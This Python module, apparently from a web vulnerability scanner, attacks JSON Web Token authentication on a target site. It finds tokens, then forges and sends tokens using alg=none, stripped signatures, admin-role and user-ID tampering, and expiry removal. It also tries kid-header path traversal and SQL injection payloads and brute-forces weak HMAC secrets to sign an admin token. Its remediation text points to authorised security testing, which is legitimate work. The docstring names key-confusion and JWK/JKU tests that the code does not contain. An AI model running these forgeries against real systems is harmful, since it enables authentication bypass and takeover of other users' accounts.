"""
JWT Attack Module — Tests for JSON Web Token vulnerabilities.

Common in banking/fintech APIs. Tests:
1. Algorithm Confusion (none, HS256↔RS256)
2. Signature Stripping — remove or corrupt signature
3. Claim Tampering — modify user_id, role, email, permissions
4. Expiration Bypass — remove exp, set far future
5. Key Confusion — use public key as HMAC secret (alg:HS256 + RS256 pubkey)
6. JWK/JKU Injection — embed key in header
7. kid Injection — path traversal or SQLi via kid parameter
8. Weak Secret Detection — brute common secrets
"""
import asyncio
import base64
import hashlib
import hmac
import json
import logging
import re
import time
from urllib.parse import urljoin, urlparse

import httpx
from app.utils.http_client import make_client

logger = logging.getLogger(__name__)

# Common JWT locations
JWT_HEADERS = ["Authorization", "X-Auth-Token", "X-Access-Token", "Token"]
JWT_COOKIE_NAMES = [
    "token", "jwt", "access_token", "auth_token", "session_token",
    "id_token", "bearer", "auth",
]

# Common weak secrets for brute force
WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "test",
    "jwt_secret", "supersecret", "changeme", "default",
    "your-256-bit-secret", "my-secret", "hs256-secret",
    "jwt-secret", "token-secret", "auth-secret", "SECRET_KEY",
    "my_secret_key", "change_me", "development", "staging",
    "secret123", "jwt123", "qwerty", "letmein", "passw0rd",
]

# Protected endpoints to test JWT against
PROTECTED_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/api/dashboard", "/api/admin", "/api/v1/me", "/api/v1/user",
    "/api/v1/account", "/api/v2/me", "/api/v2/user",
    "/dashboard", "/admin", "/account", "/profile",
    "/api/users", "/api/accounts", "/api/transactions",
]


class JWTAttackModule:
    """Tests for JWT vulnerabilities."""

    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(10)
        self._custom_headers: dict = {}
        self._auth_cookie: str | None = None
        self._auth_headers: dict = {}
        self._session_cookies: dict = {}

    async def run(self, context: dict) -> list[dict]:
        base_url = context.get("base_url", "")
        if not base_url:
            return []

        self._setup_auth(context)
        findings: list[dict] = []

        # Step 1: Find JWTs in context
        jwts = self._extract_jwts(context)
        if not jwts:
            # Try to find JWT by probing endpoints
            jwts = await self._probe_for_jwt(base_url, context)

        if not jwts:
            logger.info("JWT attacks: no JWT tokens found")
            return []

        logger.info(f"JWT attacks: found {len(jwts)} JWT token(s)")

        # Step 2: Find a protected endpoint that validates JWT
        protected_url = await self._find_protected_endpoint(base_url, context)

        # Step 3: Run attacks
        for jwt_info in jwts[:3]:  # Test up to 3 tokens
            token = jwt_info["token"]
            location = jwt_info["location"]

            # Analyze token structure
            decoded = self._decode_jwt(token)
            if not decoded:
                continue

            header, payload, signature = decoded

            # Run all attack types
            results = await self._test_alg_none(
                token, header, payload, base_url, protected_url, location,
            )
            findings.extend(results)

            results = await self._test_signature_strip(
                token, header, payload, base_url, protected_url, location,
            )
            findings.extend(results)

            results = await self._test_claim_tampering(
                token, header, payload, base_url, protected_url, location,
            )
            findings.extend(results)

            results = await self._test_expiration_bypass(
                token, header, payload, base_url, protected_url, location,
            )
            findings.extend(results)

            results = await self._test_kid_injection(
                token, header, payload, base_url, protected_url, location,
            )
            findings.extend(results)

            results = await self._test_weak_secret(
                token, header, payload, base_url, protected_url, location,
            )
            findings.extend(results)

        # Dedup
        seen = set()
        deduped = []
        for f in findings:
            key = f.get("title", "")[:60]
            if key not in seen:
                seen.add(key)
                deduped.append(f)

        logger.info(f"JWT attacks: {len(deduped)} findings")
        return deduped

    # ─── Setup ───────────────────────────────────────────────────────────

    def _setup_auth(self, context: dict):
        self._custom_headers = context.get("custom_headers", {})
        self._auth_cookie = context.get("auth_cookie")
        self._auth_headers = context.get("auth_headers", {})
        self._session_cookies = context.get("session_cookies", {})

    def _build_headers(self) -> dict:
        headers = dict(self._custom_headers)
        if self._auth_headers:
            headers.update(self._auth_headers)
        if self._session_cookies:
            headers["Cookie"] = "; ".join(
                f"{k}={v}" for k, v in self._session_cookies.items()
            )
        elif self._auth_cookie:
            if self._auth_cookie.startswith("token="):
                headers["Authorization"] = (
                    f"Bearer {self._auth_cookie.split('=', 1)[1]}"
                )
            else:
                headers["Cookie"] = self._auth_cookie
        return headers

    # ─── JWT Extraction ──────────────────────────────────────────────────

    def _extract_jwts(self, context: dict) -> list[dict]:
        """Extract JWT tokens from scan context."""
        jwts = []
        seen = set()

        # From harvested tokens
        for name, value in context.get("harvested_tokens", {}).items():
            if isinstance(value, str) and self._is_jwt(value):
                if value not in seen:
                    seen.add(value)
                    jwts.append({"token": value, "location": f"harvested:{name}"})

        # From auth headers
        auth_header = self._auth_headers.get(
            "Authorization", self._auth_headers.get("authorization", "")
        )
        if auth_header:
            token = auth_header.replace("Bearer ", "").replace("bearer ", "")
            if self._is_jwt(token) and token not in seen:
                seen.add(token)
                jwts.append({"token": token, "location": "Authorization header"})

        # From cookies
        for name, value in self._session_cookies.items():
            if isinstance(value, str) and self._is_jwt(value):
                if value not in seen:
                    seen.add(value)
                    jwts.append({"token": value, "location": f"cookie:{name}"})

        # From auth_cookie
        if self._auth_cookie:
            parts = self._auth_cookie.split("=", 1)
            if len(parts) == 2 and self._is_jwt(parts[1]):
                if parts[1] not in seen:
                    seen.add(parts[1])
                    jwts.append({
                        "token": parts[1],
                        "location": f"cookie:{parts[0]}",
                    })

        # From scan results (response bodies)
        for ep_data in context.get("endpoints", []):
            if isinstance(ep_data, dict):
                body = ep_data.get("response_body", "")
                if isinstance(body, str):
                    for match in re.finditer(
                        r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
                        body,
                    ):
                        token = match.group()
                        if token not in seen:
                            seen.add(token)
                            jwts.append({
                                "token": token,
                                "location": f"response:{ep_data.get('url', '?')}",
                            })

        return jwts

    async def _probe_for_jwt(self, base_url: str, context: dict) -> list[dict]:
        """Try to get a JWT by hitting login/auth endpoints."""
        jwts = []
        headers = self._build_headers()

        async with make_client(extra_headers=headers) as client:
            for path in PROTECTED_PATHS[:5]:
                url = base_url.rstrip("/") + path
                try:
                    async with self.rate_limit:
                        resp = await client.get(url, timeout=8)
                        # Check response for JWT
                        for h_name in JWT_HEADERS:
                            h_val = resp.headers.get(h_name, "")
                            token = h_val.replace("Bearer ", "")
                            if self._is_jwt(token):
                                jwts.append({
                                    "token": token,
                                    "location": f"header:{h_name} from {path}",
                                })

                        # Check response body
                        body = resp.text
                        for match in re.finditer(
                            r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
                            body,
                        ):
                            jwts.append({
                                "token": match.group(),
                                "location": f"body:{path}",
                            })

                        # Check cookies
                        for name, value in resp.cookies.items():
                            if self._is_jwt(value):
                                jwts.append({
                                    "token": value,
                                    "location": f"cookie:{name} from {path}",
                                })
                except Exception:
                    continue

                if jwts:
                    break

        return jwts

    async def _find_protected_endpoint(self, base_url: str,
                                        context: dict) -> str | None:
        """Find an endpoint that validates JWT and returns different responses."""
        headers = self._build_headers()

        async with make_client(extra_headers=headers) as client:
            for path in PROTECTED_PATHS:
                url = base_url.rstrip("/") + path
                try:
                    async with self.rate_limit:
                        # With auth
                        auth_resp = await client.get(url, timeout=8)
                    async with self.rate_limit:
                        # Without auth
                        noauth_resp = await client.get(
                            url, headers={"User-Agent": "Mozilla/5.0"}, timeout=8,
                        )

                    if (auth_resp.status_code == 200 and
                            noauth_resp.status_code in (401, 403)):
                        return url
                except Exception:
                    continue

        return None

    # ─── JWT Helpers ─────────────────────────────────────────────────────

    @staticmethod
    def _is_jwt(token: str) -> bool:
        if not token or not isinstance(token, str):
            return False
        parts = token.split(".")
        if len(parts) != 3:
            return False
        try:
            # Check header is valid JSON
            header = base64.urlsafe_b64decode(parts[0] + "==")
            data = json.loads(header)
            return "alg" in data or "typ" in data
        except Exception:
            return False

    @staticmethod
    def _decode_jwt(token: str) -> tuple[dict, dict, str] | None:
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            return header, payload, parts[2]
        except Exception:
            return None

    @staticmethod
    def _encode_jwt_part(data: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    def _forge_jwt(self, header: dict, payload: dict,
                   secret: str = "", sign: bool = False) -> str:
        """Create a JWT with optional HMAC-SHA256 signature."""
        h = self._encode_jwt_part(header)
        p = self._encode_jwt_part(payload)
        if sign and secret:
            sig = hmac.new(
                secret.encode(), f"{h}.{p}".encode(), hashlib.sha256,
            ).digest()
            s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        else:
            s = ""
        return f"{h}.{p}.{s}"

    async def _send_jwt(self, client: httpx.AsyncClient, url: str,
                        token: str, location: str) -> httpx.Response | None:
        """Send request with forged JWT in the right location."""
        try:
            headers = dict(self._build_headers())
            if "header" in location or "Authorization" in location:
                headers["Authorization"] = f"Bearer {token}"
            elif "cookie" in location:
                cookie_name = location.split(":")[-1].split(" ")[0]
                if "Cookie" in headers:
                    headers["Cookie"] += f"; {cookie_name}={token}"
                else:
                    headers["Cookie"] = f"{cookie_name}={token}"
            else:
                headers["Authorization"] = f"Bearer {token}"

            async with self.rate_limit:
                return await client.get(url, headers=headers, timeout=8)
        except Exception:
            return None

    def _is_authenticated(self, resp: httpx.Response | None) -> bool:
        """Check if response indicates successful authentication."""
        if not resp:
            return False
        if resp.status_code not in (200, 201):
            return False
        body = resp.text.lower()[:2000]
        if any(kw in body for kw in
               ["unauthorized", "invalid token", "jwt expired",
                "token invalid", "forbidden", "access denied"]):
            return False
        if any(kw in body for kw in
               ["dashboard", "profile", "account", "welcome",
                "user", "email", "name", "balance"]):
            return True
        return len(body) > 200  # Non-trivial response

    # ─── Attack Tests ────────────────────────────────────────────────────

    async def _test_alg_none(self, token: str, header: dict, payload: dict,
                              base_url: str, protected_url: str | None,
                              location: str) -> list[dict]:
        """Test algorithm=none bypass."""
        findings = []
        url = protected_url or base_url.rstrip("/") + "/api/me"

        none_variants = ["none", "None", "NONE", "nOnE"]

        async with make_client() as client:
            # Baseline: request without any auth
            baseline = await self._send_jwt(client, url, "invalid.token.here", location)

            for alg in none_variants:
                forged_header = dict(header)
                forged_header["alg"] = alg
                forged = self._forge_jwt(forged_header, payload)

                resp = await self._send_jwt(client, url, forged, location)

                if self._is_authenticated(resp):
                    if not baseline or not self._is_authenticated(baseline):
                        findings.append({
                            "title": f"JWT Algorithm None Bypass (alg={alg})",
                            "url": url,
                            "severity": "critical",
                            "vuln_type": "jwt_vuln",
                            "description": (
                                f"Server accepts JWT with alg={alg}, allowing "
                                f"complete signature bypass. Any claims can be "
                                f"forged without knowing the secret key."
                            ),
                            "impact": (
                                "Full authentication bypass. Attacker can forge "
                                "any JWT token with arbitrary claims (admin, "
                                "any user_id, elevated permissions)."
                            ),
                            "remediation": (
                                "Reject 'none' algorithm. Whitelist allowed "
                                "algorithms. Use a JWT library that disallows "
                                "alg=none by default."
                            ),
                            "payload": forged[:100] + "...",
                        })
                        break  # One is enough
        return findings

    async def _test_signature_strip(self, token: str, header: dict,
                                     payload: dict, base_url: str,
                                     protected_url: str | None,
                                     location: str) -> list[dict]:
        """Test if server accepts JWT with empty/corrupted signature."""
        findings = []
        url = protected_url or base_url.rstrip("/") + "/api/me"
        parts = token.split(".")

        tampered_tokens = [
            (f"{parts[0]}.{parts[1]}.", "empty signature"),
            (f"{parts[0]}.{parts[1]}.AAAA", "corrupted signature"),
            (f"{parts[0]}.{parts[1]}", "missing signature (2 parts)"),
        ]

        async with make_client() as client:
            baseline = await self._send_jwt(client, url, "x.x.x", location)

            for tampered, desc in tampered_tokens:
                resp = await self._send_jwt(client, url, tampered, location)
                if self._is_authenticated(resp):
                    if not baseline or not self._is_authenticated(baseline):
                        findings.append({
                            "title": f"JWT Signature Not Verified ({desc})",
                            "url": url,
                            "severity": "critical",
                            "vuln_type": "jwt_vuln",
                            "description": (
                                f"Server accepts JWT with {desc}. "
                                f"Signature verification is not enforced."
                            ),
                            "impact": (
                                "Attacker can modify JWT claims without "
                                "knowing the secret key."
                            ),
                            "remediation": (
                                "Always verify JWT signatures server-side. "
                                "Reject tokens with invalid or missing signatures."
                            ),
                            "payload": tampered[:80] + "...",
                        })
                        break
        return findings

    async def _test_claim_tampering(self, token: str, header: dict,
                                     payload: dict, base_url: str,
                                     protected_url: str | None,
                                     location: str) -> list[dict]:
        """Modify JWT claims to escalate privileges."""
        findings = []
        url = protected_url or base_url.rstrip("/") + "/api/me"

        # Build tampered payloads
        tamper_tests = []

        # Role escalation
        for role_field in ["role", "roles", "user_type", "type", "is_admin",
                           "admin", "permission", "permissions", "group"]:
            if role_field in payload:
                tampered = dict(payload)
                if isinstance(payload[role_field], bool):
                    tampered[role_field] = True
                elif isinstance(payload[role_field], str):
                    tampered[role_field] = "admin"
                elif isinstance(payload[role_field], list):
                    tampered[role_field] = ["admin", "superuser"]
                elif isinstance(payload[role_field], int):
                    tampered[role_field] = 0  # Often 0 = admin
                tamper_tests.append((tampered, f"role escalation ({role_field})"))

        # User ID tampering
        for id_field in ["sub", "user_id", "uid", "id", "account_id",
                         "customer_id"]:
            if id_field in payload:
                tampered = dict(payload)
                original = payload[id_field]
                if isinstance(original, int):
                    tampered[id_field] = 1  # Usually admin
                elif isinstance(original, str):
                    if original.isdigit():
                        tampered[id_field] = "1"
                    else:
                        tampered[id_field] = "admin"
                tamper_tests.append((
                    tampered, f"user ID change ({id_field}: {original}→{tampered[id_field]})"
                ))

        # Add admin claim
        if "role" not in payload and "admin" not in payload:
            tampered = dict(payload)
            tampered["role"] = "admin"
            tampered["is_admin"] = True
            tamper_tests.append((tampered, "injected admin role"))

        if not tamper_tests:
            return []

        async with make_client() as client:
            # Get original response
            original_resp = await self._send_jwt(client, url, token, location)

            for tampered_payload, desc in tamper_tests[:5]:
                # Try with original algorithm (signing won't work without key,
                # but some servers don't verify)
                forged = self._forge_jwt(header, tampered_payload)
                resp = await self._send_jwt(client, url, forged, location)

                if resp and self._is_authenticated(resp):
                    # Check if response differs from original (different user/role)
                    if original_resp and resp.text[:500] != original_resp.text[:500]:
                        findings.append({
                            "title": f"JWT Claim Tampering: {desc}",
                            "url": url,
                            "severity": "critical",
                            "vuln_type": "jwt_vuln",
                            "description": (
                                f"Modified JWT claims ({desc}) and server "
                                f"accepted the forged token. Response differs "
                                f"from original — privilege escalation likely."
                            ),
                            "impact": (
                                "Attacker can escalate to admin or access "
                                "other users' data by tampering JWT claims."
                            ),
                            "remediation": (
                                "Verify JWT signatures before trusting claims. "
                                "Use asymmetric keys (RS256/ES256). Never use "
                                "client-provided role/permission claims."
                            ),
                            "payload": json.dumps(tampered_payload)[:200],
                        })
                        break
        return findings

    async def _test_expiration_bypass(self, token: str, header: dict,
                                       payload: dict, base_url: str,
                                       protected_url: str | None,
                                       location: str) -> list[dict]:
        """Test if expired JWTs are accepted."""
        findings = []
        url = protected_url or base_url.rstrip("/") + "/api/me"

        exp_tests = []

        # Remove exp claim
        if "exp" in payload:
            no_exp = {k: v for k, v in payload.items() if k != "exp"}
            exp_tests.append((no_exp, "exp claim removed"))

        # Set exp to far past
        expired = dict(payload)
        expired["exp"] = 1000000000  # 2001
        exp_tests.append((expired, "exp set to year 2001"))

        # Set exp to far future
        future = dict(payload)
        future["exp"] = int(time.time()) + 10 * 365 * 86400  # 10 years
        if "iat" in future:
            future["iat"] = int(time.time())
        exp_tests.append((future, "exp set to 10 years future"))

        if not exp_tests:
            return []

        async with make_client() as client:
            for tampered_payload, desc in exp_tests:
                forged = self._forge_jwt(header, tampered_payload)
                resp = await self._send_jwt(client, url, forged, location)

                if self._is_authenticated(resp):
                    # Only report if exp was in the past
                    if "past" in desc or "removed" in desc:
                        findings.append({
                            "title": f"JWT Expiration Bypass: {desc}",
                            "url": url,
                            "severity": "high",
                            "vuln_type": "jwt_vuln",
                            "description": (
                                f"Server accepts JWT with {desc}. "
                                f"Token expiration is not enforced."
                            ),
                            "impact": (
                                "Stolen JWT tokens remain valid indefinitely. "
                                "Session cannot be properly invalidated."
                            ),
                            "remediation": (
                                "Validate exp claim on every request. "
                                "Reject tokens without exp. Use short-lived "
                                "tokens (15-30 minutes) with refresh tokens."
                            ),
                            "payload": json.dumps(tampered_payload)[:200],
                        })
                        break
        return findings

    async def _test_kid_injection(self, token: str, header: dict,
                                   payload: dict, base_url: str,
                                   protected_url: str | None,
                                   location: str) -> list[dict]:
        """Test kid parameter for path traversal / SQLi."""
        findings = []
        url = protected_url or base_url.rstrip("/") + "/api/me"

        kid_tests = [
            # Path traversal to known files
            ("../../../../../../dev/null", "HS256", "", "path traversal to /dev/null"),
            ("../../../../../../etc/hostname", "HS256", "", "path traversal to /etc/hostname"),
            # SQL injection
            ("' UNION SELECT 'secret' --", "HS256", "secret", "SQL injection in kid"),
            ("' OR '1'='1", "HS256", "", "SQL injection boolean"),
        ]

        async with make_client() as client:
            for kid_val, alg, sign_key, desc in kid_tests:
                forged_header = dict(header)
                forged_header["kid"] = kid_val
                forged_header["alg"] = alg

                forged = self._forge_jwt(
                    forged_header, payload,
                    secret=sign_key, sign=bool(sign_key),
                )
                resp = await self._send_jwt(client, url, forged, location)

                if self._is_authenticated(resp):
                    findings.append({
                        "title": f"JWT kid Injection: {desc}",
                        "url": url,
                        "severity": "critical",
                        "vuln_type": "jwt_vuln",
                        "description": (
                            f"Server processes kid={kid_val!r} without "
                            f"sanitization — {desc} succeeded."
                        ),
                        "impact": (
                            "Attacker can forge JWTs by controlling the "
                            "key lookup via kid injection (path traversal "
                            "or SQL injection)."
                        ),
                        "remediation": (
                            "Sanitize kid parameter. Use allowlist of valid "
                            "key IDs. Never use kid in file paths or SQL."
                        ),
                        "payload": f"kid: {kid_val}",
                    })
                    break
        return findings

    async def _test_weak_secret(self, token: str, header: dict,
                                 payload: dict, base_url: str,
                                 protected_url: str | None,
                                 location: str) -> list[dict]:
        """Brute force common HMAC secrets."""
        findings = []
        url = protected_url or base_url.rstrip("/") + "/api/me"

        alg = header.get("alg", "")
        if alg not in ("HS256", "HS384", "HS512"):
            return []

        parts = token.split(".")
        if len(parts) != 3:
            return []

        signing_input = f"{parts[0]}.{parts[1]}".encode()
        original_sig = parts[2]

        # Determine hash function
        hash_fn = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)

        for secret in WEAK_SECRETS:
            sig = hmac.new(
                secret.encode(), signing_input, hash_fn,
            ).digest()
            computed = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

            if computed == original_sig:
                # Verify by forging a token with this secret
                forged_payload = dict(payload)
                forged_payload["role"] = "admin"
                forged = self._forge_jwt(
                    header, forged_payload, secret=secret, sign=True,
                )

                async with make_client() as client:
                    resp = await self._send_jwt(client, url, forged, location)

                findings.append({
                    "title": f"JWT Weak Secret: '{secret}'",
                    "url": url,
                    "severity": "critical",
                    "vuln_type": "jwt_vuln",
                    "description": (
                        f"JWT is signed with weak/common secret: '{secret}'. "
                        f"Attacker can forge arbitrary tokens."
                    ),
                    "impact": (
                        "Complete authentication bypass. Any JWT claim can "
                        "be forged — admin access, user impersonation, etc."
                    ),
                    "remediation": (
                        "Use cryptographically random secret (256+ bits). "
                        "Consider switching to asymmetric algorithms "
                        "(RS256, ES256). Rotate compromised secret immediately."
                    ),
                    "payload": f"Secret: {secret}",
                    "proof": f"Signature matches with secret='{secret}'",
                })
                break

        return findings
